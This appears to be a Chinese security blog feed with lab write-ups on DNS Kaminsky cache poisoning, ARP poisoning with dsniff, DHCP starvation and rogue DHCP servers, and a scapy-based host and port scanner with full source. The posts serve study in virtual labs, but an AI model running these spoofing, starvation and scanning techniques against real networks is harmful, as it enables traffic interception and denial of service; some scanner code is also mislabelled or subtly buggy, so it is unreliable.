伪造NS记录<br>如果只是针对于一个域名解析进行投毒，这显然是不够的。如果能够对本地服务器的NS投毒，那么访问所有子域名都将会中毒。</li></ol><p>编写代码：<br>更改上面代码，删除A记录，保留NS记录即可。<br>运行程序，发现已经污染NS记录，现在对example.com的请求都会被定向到攻击者的域名解析器：</p><ol start="6"><li>   伪造DNS附加记录<br>在上面代码additional部分添加记录即可，但是不会起作用。</li></ol><p>因为DNS有附加域名的检查机制，因此在附加中填入恶意信息都将不被接受。</p><p>DNS远程攻击实验<br>7.实验环境<br>1)拓扑结构</p><ol start="8"><li>   Kaminsky攻击<br>DNS查询过程：</li></ol><p>Kaminsky攻击过程：<br>一般的远程对本地DNS服务器的攻击，会对会话ID进行爆破，但是由于缓存机制存在，爆破的机会很少。Kaminsky解决了这个问题，当发起多个不存在域名的DNS请求时，由于不存在缓存，因此本地DNS服务器都会对TLD进行询问，当我们发送足够多的不存在域名，我们就能够获取足够多的猜测机会，从而破解出会话ID，更改NS记录，实现攻击。</p><ol><li>   构造DNS请求<br>编写代码。通过scapy发送一个DNS请求即可，同时保存这个包到bin文件即可：</li></ol><p>运行程序，在warshark中可以看到这个DNS请求，同时它还造成本地DNS服务器响应，说明包构造成功。</p><p>使用共享文件夹中的display程序查看生成包：</p><ol start="2"><li>   伪造DNS回复<br>编写程序。通过scapy伪造一个回应包即可，在进行kaminsky攻击时需要将源IP替换为TLD服务器的地址：“199.43.135.53”，保留NS记录即可：</li></ol><p>运行程序，在warshark中查看到DNS响应包：</p><p>查看包，通过display程序查看包如下：</p><ol start="3"><li>   实施kaminsky攻击<br>编写代码。首先加载上面两个task保存在两个bin文件的数据包。生成前面5位随机的域名，发送这个DNS请求，同时伪造DNS响应包欺骗本地DNS服务器，导致example.com的权威服务器被污染。</li></ol><p>运行程序，查看本地DNS服务器中example.com的NS记录。发现已经成功被程序修改为攻击者的域名服务器了：</p>]]></content>
      
      
      <categories>
          
          <category> SEED </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEED </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARP毒化</title>
      <link href="/posts/network_ARP/"/>
      <url>/posts/network_ARP/</url>
      
        <content type="html"><![CDATA[<h1 id="一-ARP协议概述"><a href="#一-ARP协议概述" class="headerlink" title="一. ARP协议概述"></a>一. ARP协议概述</h1><p>建议你先学习计算机网络以及ARP协议部分。</p><h2 id="1-arp缓存"><a href="#1-arp缓存" class="headerlink" title="1. arp缓存"></a>1. arp缓存</h2><h3 id="查看你的主机arp缓存"><a href="#查看你的主机arp缓存" class="headerlink" title="查看你的主机arp缓存"></a>查看你的主机arp缓存</h3><p>arp缓存表存储在主机的内存中。</p><ul><li>对于Windows操作系统，你可以在终端中使用命令 <em><strong>arp -a</strong></em> 查看电脑的arp缓存表。</li><li>对于Linux操作系统，使用命令 <em><strong>arp</strong></em> 即可。</li></ul><h3 id="你的arp缓存表的内容"><a href="#你的arp缓存表的内容" class="headerlink" title="你的arp缓存表的内容"></a>你的arp缓存表的内容</h3><p>一般来说，arp缓存只关心子网下其他主机。</p><ul><li>对于路由器下的子网，arp缓存其他主机的MAC地址为路由器（网关）的MAC地址，因为主机访问其他主机的下一跳是路由器。</li><li>对于交换机下的子网，arp缓存其他主机的真实MAC地址。</li><li>当你访问子网外的IP地址时，MAC地址默认为网关地址。</li></ul><h2 id="2-arp报文"><a href="#2-arp报文" class="headerlink" title="2. arp报文"></a>2. arp报文</h2><p>你可以使用python的scapy库写一个arp请求函数，这非常简单。</p><pre><code class="python">def arp(ipy):    dst_ip_list = IPY(ipy)    alive_ip_list = []    for dst_ip in dst_ip_list:        pkt = ARP(pdst=str(dst_ip))        # pkt.show()        ans = sr1(pkt, timeout=1, verbose=False)        if ans is not None:            # ans.summary()            # ans.show()            alive_ip_list.append(dst_ip)            print(dst_ip, &#39;is up&#39;)        else:            print(dst_ip, &#39;is closed&#39;)    return alive_ip_list</code></pre><p>构造一个请求，通过warsahrk抓包，你可以对协议的实现有更多了解。</p><h1 id="二-断断室友的网？刑"><a href="#二-断断室友的网？刑" class="headerlink" title="二. 断断室友的网？刑"></a>二. 断断室友的网？刑</h1><p><em><strong>本次实验在虚拟环境中完成，你需要知道未被授权的攻击不被允许。</strong></em></p><p>当你了解arp缓存和arp报文相关内容以后，下面这一步非常简单。</p><p>这里有两台虚拟机。Ubuntu（20.04）发起arp攻击；Windows（7）作为被攻击对象，并查看被攻击后的结果。</p><p>下面是实操部分：</p><h2 id="1-Ubuntu发起攻击"><a href="#1-Ubuntu发起攻击" class="headerlink" title="1. Ubuntu发起攻击"></a>1. Ubuntu发起攻击</h2><h3 id="安装dsniff"><a href="#安装dsniff" class="headerlink" title="安装dsniff"></a>安装dsniff</h3><p>在终端输入命令 <em><strong>sudo apt install dsniff</strong></em>，这里我已经安装完成。<br><img src="/img/network_arp/image.png" alt="Alt text"></p><h3 id="使用dsniff毒化目标主机"><a href="#使用dsniff毒化目标主机" class="headerlink" title="使用dsniff毒化目标主机"></a>使用dsniff毒化目标主机</h3><p><em><strong>网关IP：192.168.59.2</strong></em></p><p><em><strong>目标主机IP：192.168.59.137</strong></em></p><p><img src="/img/network_arp/image-2.png" alt="Alt text"></p><h2 id="2-Windows受到攻击"><a href="#2-Windows受到攻击" class="headerlink" title="2. Windows受到攻击"></a>2. Windows受到攻击</h2><h3 id="受到攻击之前"><a href="#受到攻击之前" class="headerlink" title="受到攻击之前"></a>受到攻击之前</h3><p>Windows虚拟机可以正常访问网络，这里访问百度作为测试</p><p><img src="/img/network_arp/image-1.png" alt="Alt text"></p><h3 id="受到攻击之后"><a href="#受到攻击之后" class="headerlink" title="受到攻击之后"></a>受到攻击之后</h3><p>Windows虚拟机无法正常访问网络</p><p><img src="/img/network_arp/image-3.png" alt="Alt text"></p><h3 id="看看Windows虚拟机arp缓存表"><a href="#看看Windows虚拟机arp缓存表" class="headerlink" title="看看Windows虚拟机arp缓存表"></a>看看Windows虚拟机arp缓存表</h3><p>可以看到Windows主机arp缓存被毒化之后网关IP映射的MAC地址变成了发起攻击Ubuntu的MAC地址。因此Windows虚拟机访问其他主机时，流量指向发起攻击的Ubuntu主机。利用这一点我们还可以做一些事情，比如中间人攻击。</p><p><img src="/img/network_arp/image-4.png" alt="Alt text"></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
            <tag> internet </tag>
            
            <tag> Protocol </tag>
            
            <tag> ARP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DHCP安全性分析</title>
      <link href="/posts/network_DHCP/"/>
      <url>/posts/network_DHCP/</url>
      
        <content type="html"><![CDATA[<h1 id="一-DHCP协议概述"><a href="#一-DHCP协议概述" class="headerlink" title="一. DHCP协议概述"></a>一. DHCP协议概述</h1><h2 id="1-上网配置信息"><a href="#1-上网配置信息" class="headerlink" title="1. 上网配置信息"></a>1. 上网配置信息</h2><p>计算机在连入WIFI后，需要获取网络配置信息才能正常上网，这些信息包括以下：</p><ul><li>主机IP地址</li><li>子网掩码</li><li>网关IP地址</li><li>DNS服务器IP地址</li></ul><h2 id="2-DHCP报文"><a href="#2-DHCP报文" class="headerlink" title="2. DHCP报文"></a>2. DHCP报文</h2><p>当你连入WIFI之前，使用Warshark对进行抓包，可以捕获到到以下DHCP报文：</p><ul><li>DISCOVER</li><li>OFFER</li><li>REQUEST</li><li>ACK</li></ul><p>如果你已经接入WIFI，你可以在终端输入命令 <em><strong>ipconfig release</strong></em> 释放你已经获取的网络配置信息。重新接入WIFI。</p><p>如果你只是单纯断开WIFI，那么原来的网络配置信息并不会清空。相比正常的DHCP交互缺少 <em><strong>DISCOVER</strong></em> 和 <em><strong>OFFER</strong></em> 报文。</p><h1 id="二-DHCP饿死攻击"><a href="#二-DHCP饿死攻击" class="headerlink" title="二. DHCP饿死攻击"></a>二. DHCP饿死攻击</h1><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><p>DHCP服务器根据DHCP报文中提供的MAC地址分发IP地址。</p><p>因此，使用主机伪造DHCP报文中的MAC地址，耗尽DHCP能够分配的IP地址，那么正常连接网络的主机将不能够接入网络，攻击完成。</p><h2 id="2-试试？"><a href="#2-试试？" class="headerlink" title="2. 试试？"></a>2. 试试？</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>Windows7（虚拟机）；Ubuntu20.04（虚拟机）</p><h3 id="下载Yersinia"><a href="#下载Yersinia" class="headerlink" title="下载Yersinia"></a>下载Yersinia</h3><p><em><strong>sudo apt install yersinia</strong></em></p><p><img src="/img/network_dhcp/image-6.png" alt="Alt text"></p><h3 id="打开Yersinia图形界面"><a href="#打开Yersinia图形界面" class="headerlink" title="打开Yersinia图形界面"></a>打开Yersinia图形界面</h3><p><em><strong>yersinia -G</strong></em></p><p>作者还挺幽默哈</p><p><img src="/img/network_dhcp/image-5.png" alt="Alt text"></p><h3 id="发起攻击"><a href="#发起攻击" class="headerlink" title="发起攻击"></a>发起攻击</h3><p><img src="/img/network_dhcp/image-9.png" alt="Alt text"></p><h3 id="攻击情况"><a href="#攻击情况" class="headerlink" title="攻击情况"></a>攻击情况</h3><p>warshark抓包分析<br>yersinia发包速度很快，电脑受不了没做太多测试。</p><p><img src="/img/network_dhcp/image-8.png" alt="Alt text"></p><h1 id="三-冒充DHCP服务器"><a href="#三-冒充DHCP服务器" class="headerlink" title="三. 冒充DHCP服务器"></a>三. 冒充DHCP服务器</h1><h2 id="1-概述-1"><a href="#1-概述-1" class="headerlink" title="1. 概述"></a>1. 概述</h2><p>当你向你的主机安装一个DHCP Server程序后，你的计算机也成为了一台DHCP服务器，但是你可以配置错误的网络配置信息，这可以使得接入网络的计算机无法获取正确的网络配置从而无法上网。</p><h2 id="2-试试？-1"><a href="#2-试试？-1" class="headerlink" title="2. 试试？"></a>2. 试试？</h2><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p><em><strong>Ubuntu20.04（虚拟机）：</strong></em></p><p><img src="/img/network_dhcp/image.png" alt="Alt text"></p><p><em><strong>Windows7（虚拟机）：</strong></em></p><p><img src="/img/network_dhcp/image-2.png" alt="Alt text"></p><h3 id="在Ubuntu中安装dhcp服务器："><a href="#在Ubuntu中安装dhcp服务器：" class="headerlink" title="在Ubuntu中安装dhcp服务器："></a>在Ubuntu中安装dhcp服务器：</h3><pre><code>sudo apt-get install isc-dhcp-server</code></pre><h3 id="配置dhcp服务器相关信息："><a href="#配置dhcp服务器相关信息：" class="headerlink" title="配置dhcp服务器相关信息："></a>配置dhcp服务器相关信息：</h3><p><em><strong>vim &#x2F;etc&#x2F;default&#x2F;isc-dhcp-server</strong></em></p><pre><code># Defaults for isc-dhcp-server (sourced by /etc/init.d/isc-dhcp-server)# Path to dhcpd&#39;s config file (default: /etc/dhcp/dhcpd.conf).#DHCPDv4_CONF=/etc/dhcp/dhcpd.conf#DHCPDv6_CONF=/etc/dhcp/dhcpd6.conf# Path to dhcpd&#39;s PID file (default: /var/run/dhcpd.pid).#DHCPDv4_PID=/var/run/dhcpd.pid#DHCPDv6_PID=/var/run/dhcpd6.pid# Additional options to start dhcpd with.#Don&#39;t use options -cf or -pf here; use DHCPD_CONF/ DHCPD_PID instead#OPTIONS=&quot;&quot;# On what interfaces should the DHCP server (dhcpd) serve DHCP requests?#Separate multiple interfaces with spaces, e.g. &quot;eth0 eth1&quot;.INTERFACESv4=&quot;ens33&quot;INTERFACESv6=&quot;&quot;</code></pre><p><em><strong>vim &#x2F;etc&#x2F;dhcp&#x2F;dhcpd.conf</strong></em></p><pre><code># dhcpd.conf## Sample configuration file for ISC dhcpd## Attention: If /etc/ltsp/dhcpd.conf exists, that will be used as# configuration file instead of this file.## option definitions common to all supported networks...option domain-name &quot;example.org&quot;;option domain-name-servers 8.8.8.8;# option domain-name-servers ns1.example.org, ns2.example.org;default-lease-time 600;max-lease-time 7200;# The ddns-updates-style parameter controls whether or not the server will# attempt to do a DNS update when a lease is confirmed. We default to the# behavior of the version 2 packages (&#39;none&#39;, since DHCP v2 didn&#39;t# have support for DDNS.)ddns-update-style none;# If this DHCP server is the official DHCP server for the local# network, the authoritative directive should be uncommented.authoritative;# Use this to send dhcp log messages to a different log file (you also# have to hack syslog.conf to complete the redirection).# log-facility local7;# No service will be given on this subnet, but declaring it helps the # DHCP server to understand the network topology.#subnet 10.152.187.0 netmask 255.255.255.0 &#123;#&#125;# This is a very basic subnet declaration.subnet 192.168.59.0 netmask 255.255.255.0 &#123;   range 192.168.59.50 192.168.59.200;   option routers 192.168.59.2;   option subnet-mask 255.255.255.0;   option broadcast-address 192.168.59.255;&#125;# This declaration allows BOOTP clients to get dynamic addresses,# which we don&#39;t really recommend.#subnet 10.254.239.32 netmask 255.255.255.224 &#123;#  range dynamic-bootp 10.254.239.40 10.254.239.60;#  option broadcast-address 10.254.239.31;#  option routers rtr-239-32-1.example.org;#&#125;# A slightly different configuration for an internal subnet.#subnet 10.5.5.0 netmask 255.255.255.224 &#123;#  range 10.5.5.26 10.5.5.30;#  option domain-name-servers ns1.internal.example.org;#  option domain-name &quot;internal.example.org&quot;;#  option subnet-mask 255.255.255.224;#  option routers 10.5.5.1;#  option broadcast-address 10.5.5.31;#  default-lease-time 600;#  max-lease-time 7200;#&#125;# Hosts which require special configuration options can be listed in# host statements.   If no address is specified, the address will be# allocated dynamically (if possible), but the host-specific information# will still come from the host declaration.#host passacaglia &#123;#  hardware ethernet 0:0:c0:5d:bd:95;#  filename &quot;vmunix.passacaglia&quot;;#  server-name &quot;toccata.example.com&quot;;#&#125;# Fixed IP addresses can also be specified for hosts.   These addresses# should not also be listed as being available for dynamic assignment.# Hosts for which fixed IP addresses have been specified can boot using# BOOTP or DHCP.   Hosts for which no fixed address is specified can only# be booted with DHCP, unless there is an address range on the subnet# to which a BOOTP client is connected which has the dynamic-bootp flag# set.#host fantasia &#123;#  hardware ethernet 08:00:07:26:c0:a5;#  fixed-address fantasia.example.com;#&#125;# You can declare a class of clients and then do address allocation# based on that.   The example below shows a case where all clients# in a certain class get addresses on the 10.17.224/24 subnet, and all# other clients get addresses on the 10.0.29/24 subnet.#class &quot;foo&quot; &#123;#  match if substring (option vendor-class-identifier, 0, 4) = &quot;SUNW&quot;;#&#125;#shared-network 224-29 &#123;#  subnet 10.17.224.0 netmask 255.255.255.0 &#123;#    option routers rtr-224.example.org;#  &#125;#  subnet 10.0.29.0 netmask 255.255.255.0 &#123;#    option routers rtr-29.example.org;#  &#125;#  pool &#123;#    allow members of &quot;foo&quot;;#    range 10.17.224.10 10.17.224.250;#  &#125;#  pool &#123;#    deny members of &quot;foo&quot;;#    range 10.0.29.10 10.0.29.230;#  &#125;#&#125;</code></pre><h3 id="启动DHCP服务器"><a href="#启动DHCP服务器" class="headerlink" title="启动DHCP服务器"></a>启动DHCP服务器</h3><p><em><strong>启动DHCP服务器：sudo systemctl start isc-dhcp-server.service</strong></em></p><p><em><strong>查看DHCP服务器运行状态：sudo systemctl status isc-dhcp-server.service</strong></em></p><p><em><strong>关闭DHCP服务器：sudo systemctl stop isc-dhcp-server.service</strong></em></p><p><img src="/img/network_dhcp/image-1.png" alt="Alt text"></p><h3 id="Windows7获取Ubuntu20-04的DHCP服务器网络配置"><a href="#Windows7获取Ubuntu20-04的DHCP服务器网络配置" class="headerlink" title="Windows7获取Ubuntu20.04的DHCP服务器网络配置"></a>Windows7获取Ubuntu20.04的DHCP服务器网络配置</h3><p>如果你已经连接网络，使用 <em><strong>ipconfig &#x2F;release</strong></em> 释放获取的网络配置</p><p>然后，使用 <em><strong>ipconfig &#x2F;renew</strong></em> 重新连接DHCP服务器获取网络配置</p><p><img src="/img/network_dhcp/image-3.png" alt="Alt text"></p><p>可以看见Windows7网络配置发生了改变</p><p><img src="/img/network_dhcp/image-4.png" alt="Alt text"></p><h1 id="四-DHCP中间人攻击"><a href="#四-DHCP中间人攻击" class="headerlink" title="四. DHCP中间人攻击"></a>四. DHCP中间人攻击</h1><p>这部分原理与ARP中间人攻击一致…</p><p>中间人攻击基本都是用ARP实现吗？…</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
            <tag> internet </tag>
            
            <tag> Protocol </tag>
            
            <tag> DHCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络扫描</title>
      <link href="/posts/network_scanner/"/>
      <url>/posts/network_scanner/</url>
      
        <content type="html"><![CDATA[<h1 id="网络扫描"><a href="#网络扫描" class="headerlink" title="网络扫描"></a>网络扫描</h1><p>通过网络扫描，可以获取网段内存活的主机以及其开放的端口，更加深入的扫描则能够探测主机的操作系统，配置，安装的软件等。</p><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>在网络中发现主机有很多方法，如果在局域网内使用arp协议可以轻易的发现存活的kv主机，如果在不同的网段使用ICMP协议也可以尝试和主机取得联系，TCP和UDP协议同样可以</p><h3 id="ARP协议探测"><a href="#ARP协议探测" class="headerlink" title="ARP协议探测"></a>ARP协议探测</h3><p>ARP协议通过向局域网广播的方式将同网段主机IP地址解析为MAC地址。</p><p>在一个路由器下的局域网内，如果对某个IP发起ARP请求，如果这个IP通过路由器上网，那么路由器肯定有这个主机的MAC地址，因此广播到路由器时会受到主机的IP地址；如果不存在这个IP，那么将没有MAC地址的回复。根据是否受到MAC地址，就可以判断局域网内的这个主机是否存活。</p><pre><code class="python">def arp(ipy):    dst_ip_list = IPY(ipy)    alive_ip_list = []    for dst_ip in dst_ip_list:        pkt = ARP(pdst=str(dst_ip))        ans = sr1(pkt, timeout=1, verbose=False)        if ans is not None:            # ans.summary()            # ans.show()            alive_ip_list.append(dst_ip)            print(dst_ip, &#39;is up&#39;)        else:            print(dst_ip, &#39;is closed&#39;)    return alive_ip_list</code></pre><h3 id="ICMP协议探测"><a href="#ICMP协议探测" class="headerlink" title="ICMP协议探测"></a>ICMP协议探测</h3><p>ICMP中的request&#x2F;ping报文可以用于测试网络的可达性和延迟情况，如果主机可达将会返回reply报文，如果不可达会返回具体原因的报文。</p><pre><code class="python">def ping(ipy):    dst_ip_list = IPY(ipy)    alive_ip_list = []    for dst_ip in dst_ip_list:        pkt = IP(dst=str(dst_ip)) / ICMP() / b&#39;hello&#39;        ans = sr1(pkt, timeout=1, verbose=False)        if ans is not None:            if ans[ICMP].type == 0:                if ans[IP].ttl &lt;= 64:                    print(dst_ip, &#39;(Linux)&#39;, &#39;is up&#39;)                elif ans[IP].ttl &lt;= 128:                    print(dst_ip, &#39;(Windows)&#39;, &#39;is up&#39;)                else:                    print(dst_ip, &#39;(Mac/Unix)&#39;, &#39;is up&#39;)                alive_ip_list.append(dst_ip)            elif ans[ICMP].type == 11:                print(dst_ip, &#39;is timeout&#39;)            elif ans[ICMP].type == 3:                print(dst_ip, &#39;is unreachable&#39;)            elif ans[ICMP].type == 4:                print(dst_ip, &#39;source quench&#39;)            elif ans[ICMP].type == 5:                print(dst_ip, &#39;redirect&#39;)            elif ans[ICMP].type == 12:                print(dst_ip, &#39;参数问题&#39;)            else:                print(dst_ip, &#39;其他问题：[ICMP].type&#39;, ans[ICMP].type)        else:            print(dst_ip, &#39;is probably filtered(no response)&#39;)    return alive_ip_list</code></pre><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>基于TCP协议可以完成多种扫描。</p><h3 id="TCP扫描"><a href="#TCP扫描" class="headerlink" title="TCP扫描"></a>TCP扫描</h3><p>通过与端口建立TCP连接判断端口的开放情况。如果端口开放，那么可以通过TCP的三次握手建立连接，然后断开连接即可；如果端口关闭，那么TCP握手无法完成。</p><p>这种方法的缺点是会在扫描的主机留下痕迹，因为一旦与主机的某个端口建立TCP连接，操作系统就会记录这条连接。并且，完成三次握手的时间会比较长，当扫描端口数量很多的时候速度会比较慢。</p><p><code>nmap  -sT [IP]</code></p><h3 id="SYN扫描"><a href="#SYN扫描" class="headerlink" title="SYN扫描"></a>SYN扫描</h3><p>SYN扫描相比于TCP扫描更加简单，它发送一个SYN报文进行握手，如果端口开放那么会收到一个SYN&amp;ACK报文，这时候回复一个RST报文断开连接即可，并且由于握手没有完成，操作系统不会记录这次扫描；如果端口关闭，那么不会收到SYN&amp;ACK报文。</p><p><code>nmap  -sS [IP]</code></p><pre><code class="python">def syn_scan(dst_ip, n, m):    alive_port_list = []    for i in range(n, m):        pkt = IP(dst=str(dst_ip)) / TCP(dport=int(i))        # pkt = IP(dst=str(dst_ip)) / TCP(sport=random.randint(1,65536),dport=int(i))        # pkt.show()        ans = sr1(pkt, timeout=1, verbose=False)        if ans is not None:            # ans.summary()            # ans.show()            if ans[TCP].flags == &#39;SA&#39;:                print(i, &#39;port is open&#39;)                alive_port_list.append(i)                rst = IP(dst=str(dst_ip)) / TCP(dport=int(i), flags=&#39;R&#39;)                sr1(rst, timeout=1, verbose=False)            else:                print(i, &#39;port is closed&#39;)        else:            print(i, &#39;port is filtered&#39;)    return alive_port_list</code></pre><p><em>根据RFC文档，对于错误TCP报文无论是开放端口还是关闭端口都应该回复RST报文，windows按照规则，但是Linux对于开放端口不会回复RST报文。</em></p><h3 id="ACK扫描"><a href="#ACK扫描" class="headerlink" title="ACK扫描"></a>ACK扫描</h3><p>ACK扫描发送一个ACK报文进行端口探测。对于Windows系统，无论是开放还是关闭的端口都会回复RST报文；但是对于Linux系统，开放的端口将不会回复任何内容，关闭的端口则会回复RST报文。</p><p>另外，如果开启防火墙那么无论Windows操作系统还是Linux操作系统都不会对错误报文回复任何内容。</p><p><code>nmap sA [IP]</code></p><pre><code class="python">def null_scan(dst_ip, n, m):    alive_port_list = []    for i in range(n, m):        pkt = IP(dst=str(dst_ip)) / TCP(dport=int(i), flags=0)        # pkt.show()        ans = sr1(pkt, timeout=1, verbose=False)        if ans is None:            print(i, &#39;port is open or filtered&#39;)            alive_port_list.append(i)        else:            # ans.summary()            # ans.show()            print(i, &#39;port is closed&#39;)    return alive_port_list</code></pre><h3 id="FIN扫描"><a href="#FIN扫描" class="headerlink" title="FIN扫描"></a>FIN扫描</h3><p>向目标主机的端口发送FIN报文。</p><p><code>nmap  -sF [IP]</code></p><pre><code class="python">def fin_scan(dst_ip, n, m):    alive_port_list = []    for i in range(n, m):        pkt = IP(dst=str(dst_ip)) / TCP(dport=int(i), flags=&#39;F&#39;)        # pkt.show()        ans = sr1(pkt, timeout=1, verbose=False)        if ans is None:            print(i, &#39;port is open or filtered&#39;)            alive_port_list.append(i)        else:            # ans.summary()            # ans.show()            print(i, &#39;port is closed&#39;)    return alive_port_list</code></pre><h3 id="NULL扫描"><a href="#NULL扫描" class="headerlink" title="NULL扫描"></a>NULL扫描</h3><pre><code class="python">def null_scan(dst_ip, n, m):    alive_port_list = []    for i in range(n, m):        pkt = IP(dst=str(dst_ip)) / TCP(dport=int(i), flags=0)        # pkt.show()        ans = sr1(pkt, timeout=1, verbose=False)        if ans is None:            print(i, &#39;port is open or filtered&#39;)            alive_port_list.append(i)        else:            # ans.summary()            # ans.show()            print(i, &#39;port is closed&#39;)    return alive_port_list</code></pre><h3 id="XMAS扫描"><a href="#XMAS扫描" class="headerlink" title="XMAS扫描"></a>XMAS扫描</h3><pre><code class="python">def xmas_scan(dst_ip, n, m):    alive_port_list = []    for i in range(n, m):        pkt = IP(dst=str(dst_ip)) / TCP(dport=int(i), flags=1)        # pkt.show()        ans = sr1(pkt, timeout=1, verbose=False)        if ans is None:            print(i, &#39;port is open or filtered&#39;)            alive_port_list.append(i)        else:            # ans.summary()            # ans.show()            print(i, &#39;port is closed&#39;)    return alive_port_list</code></pre><h3 id="WINDOWS扫描"><a href="#WINDOWS扫描" class="headerlink" title="WINDOWS扫描"></a>WINDOWS扫描</h3><pre><code class="python">def windows_scan(dst_ip, n, m):    alive_port_list = []    for i in range(n, m):        pkt = IP(dst=str(dst_ip)) / TCP(dport=int(i), flags=&#39;S&#39;)        # pkt.show()        ans = sr1(pkt, timeout=1, verbose=False)        if ans is not None:            # ans.summary()            # ans.show()            if ans[TCP].window != 0:                print(i, &#39;port is open&#39;)                alive_port_list.append(i)                rst = IP(dst=str(dst_ip)) / TCP(dport=int(i), flags=&#39;R&#39;)                sr1(rst, timeout=1, verbose=False)            else:                print(i, &#39;port is closed&#39;)        else:            print(i, &#39;port is filtered&#39;)    return alive_port_list</code></pre><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><pre><code class="python">from scapy.all import *from IPy import IP as IPYfrom scapy.layers.inet import ICMP, IP, TCPfrom scapy.layers.l2 import ARPdef preview(list):    preview = input(&quot;预览（y/n）:&quot;)    if preview == &#39;y&#39; or &#39;Y&#39;:        for li in list:            print(li)def arp(ipy):    dst_ip_list = IPY(ipy)    alive_ip_list = []    for dst_ip in dst_ip_list:        pkt = ARP(pdst=str(dst_ip))        ans = sr1(pkt, timeout=1, verbose=False)        if ans is not None:            # ans.summary()            # ans.show()            alive_ip_list.append(dst_ip)            print(dst_ip, &#39;is up&#39;)        else:            print(dst_ip, &#39;is closed&#39;)    return alive_ip_listdef ping(ipy):    dst_ip_list = IPY(ipy)    alive_ip_list = []    for dst_ip in dst_ip_list:        pkt = IP(dst=str(dst_ip)) / ICMP() / b&#39;hello&#39;        ans = sr1(pkt, timeout=1, verbose=False)        if ans is not None:            if ans[ICMP].type == 0:                if ans[IP].ttl &lt;= 64:                    print(dst_ip, &#39;(Linux)&#39;, &#39;is up&#39;)                elif ans[IP].ttl &lt;= 128:                    print(dst_ip, &#39;(Windows)&#39;, &#39;is up&#39;)                else:                    print(dst_ip, &#39;(Mac/Unix)&#39;, &#39;is up&#39;)                alive_ip_list.append(dst_ip)            elif ans[ICMP].type == 11:                print(dst_ip, &#39;is timeout&#39;)            elif ans[ICMP].type == 3:                print(dst_ip, &#39;is unreachable&#39;)            elif ans[ICMP].type == 4:                print(dst_ip, &#39;source quench&#39;)            elif ans[ICMP].type == 5:                print(dst_ip, &#39;redirect&#39;)            elif ans[ICMP].type == 12:                print(dst_ip, &#39;参数问题&#39;)            else:                print(dst_ip, &#39;其他问题：[ICMP].type&#39;, ans[ICMP].type)        else:            print(dst_ip, &#39;is probably filtered(no response)&#39;)    return alive_ip_listdef syn_scan(dst_ip, n, m):    alive_port_list = []    for i in range(n, m):        pkt = IP(dst=str(dst_ip)) / TCP(dport=int(i))        # pkt = IP(dst=str(dst_ip)) / TCP(sport=random.randint(1,65536),dport=int(i))        # pkt.show()        ans = sr1(pkt, timeout=1, verbose=False)        if ans is not None:            # ans.summary()            # ans.show()            if ans[TCP].flags == &#39;SA&#39;:                print(i, &#39;port is open&#39;)                alive_port_list.append(i)                rst = IP(dst=str(dst_ip)) / TCP(dport=int(i), flags=&#39;R&#39;)                sr1(rst, timeout=1, verbose=False)            else:                print(i, &#39;port is closed&#39;)        else:            print(i, &#39;port is filtered&#39;)    return alive_port_listdef ack_scan(dst_ip, n, m):    alive_port_list = []    for i in range(n, m):        pkt = IP(dst=str(dst_ip)) / TCP(dport=int(i), flags=&#39;A&#39;)        # pkt.show()        ans = sr1(pkt, timeout=0.2, verbose=False)        if ans is None:            print(i, &#39;port is filtered&#39;)        else:            # ans.summary()            # ans.show()            print(i, &#39;port is closed&#39;)    return alive_port_listdef fin_scan(dst_ip, n, m):    alive_port_list = []    for i in range(n, m):        pkt = IP(dst=str(dst_ip)) / TCP(dport=int(i), flags=&#39;F&#39;)        # pkt.show()        ans = sr1(pkt, timeout=1, verbose=False)        if ans is None:            print(i, &#39;port is open or filtered&#39;)            alive_port_list.append(i)        else:            # ans.summary()            # ans.show()            print(i, &#39;port is closed&#39;)    return alive_port_listdef null_scan(dst_ip, n, m):    alive_port_list = []    for i in range(n, m):        pkt = IP(dst=str(dst_ip)) / TCP(dport=int(i), flags=0)        # pkt.show()        ans = sr1(pkt, timeout=1, verbose=False)        if ans is None:            print(i, &#39;port is open or filtered&#39;)            alive_port_list.append(i)        else:            # ans.summary()            # ans.show()            print(i, &#39;port is closed&#39;)    return alive_port_listdef xmas_scan(dst_ip, n, m):    alive_port_list = []    for i in range(n, m):        pkt = IP(dst=str(dst_ip)) / TCP(dport=int(i), flags=1)        # pkt.show()        ans = sr1(pkt, timeout=1, verbose=False)        if ans is None:            print(i, &#39;port is open or filtered&#39;)            alive_port_list.append(i)        else:            # ans.summary()            # ans.show()            print(i, &#39;port is closed&#39;)    return alive_port_listdef windows_scan(dst_ip, n, m):    alive_port_list = []    for i in range(n, m):        pkt = IP(dst=str(dst_ip)) / TCP(dport=int(i), flags=&#39;S&#39;)        # pkt.show()        ans = sr1(pkt, timeout=1, verbose=False)        if ans is not None:            # ans.summary()            # ans.show()            if ans[TCP].window != 0:                print(i, &#39;port is open&#39;)                alive_port_list.append(i)                rst = IP(dst=str(dst_ip)) / TCP(dport=int(i), flags=&#39;R&#39;)                sr1(rst, timeout=1, verbose=False)            else:                print(i, &#39;port is closed&#39;)        else:            print(i, &#39;port is filtered&#39;)    return alive_port_listif __name__ == &#39;__main__&#39;:    # 主机ip（移动）    # dst_ip = &#39;10.132.68.173&#39;    # 网关ip    # dst_ip = &#39;10.132.168.1&#39;    # 子网    # dst_ip = &#39;10.132.168.0/21&#39;    # Windows虚拟机ip    # dst_ip = &#39;192.168.59.132&#39;    # Linux虚拟机ip    # dst_ip = &#39;192.168.59.131&#39;    while True:        print(&#39;-------net scanner-------&#39;)        service = input(&#39;你选择主机扫描或是端口扫描?（host/port）：&#39;)        if service == &#39;host&#39;:            way = input(&#39;请输入扫描方式（arp/ping）：&#39;)            